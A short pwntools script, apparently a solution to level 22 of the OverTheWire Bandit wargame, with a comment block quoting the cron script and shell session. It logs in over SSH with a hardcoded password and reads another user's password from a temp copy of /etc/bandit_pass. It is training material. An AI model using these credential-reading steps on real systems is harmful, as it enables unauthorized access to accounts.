from pwn import *
user = "bandit22"
password = "Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI"
host = "bandit.labs.overthewire.org"
port = 2220

shell = ssh(user, host, password=password, port=port)
sh = shell.run('sh')
log.info("Script is placed in /usr/bin/cronjob_bandit23.sh")
log.info("Checked the script and pasted the same in terminal and got the result by echo command")
sh.sendline("cat /tmp/8ca319486bfbbc3663ea0fbe81326349")
log.success("The Password for bandit23 is ===" + sh.recvline().decode("utf-8"))
sh.close()

'''
==========Program===================
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

==========COMMANDS==================
bandit22@bandit:~$ myname=$(whoami)
bandit22@bandit:~$ echo $myname
bandit22
bandit22@bandit:~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ echo $mytarget
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit22@bandit:~$ 
'''
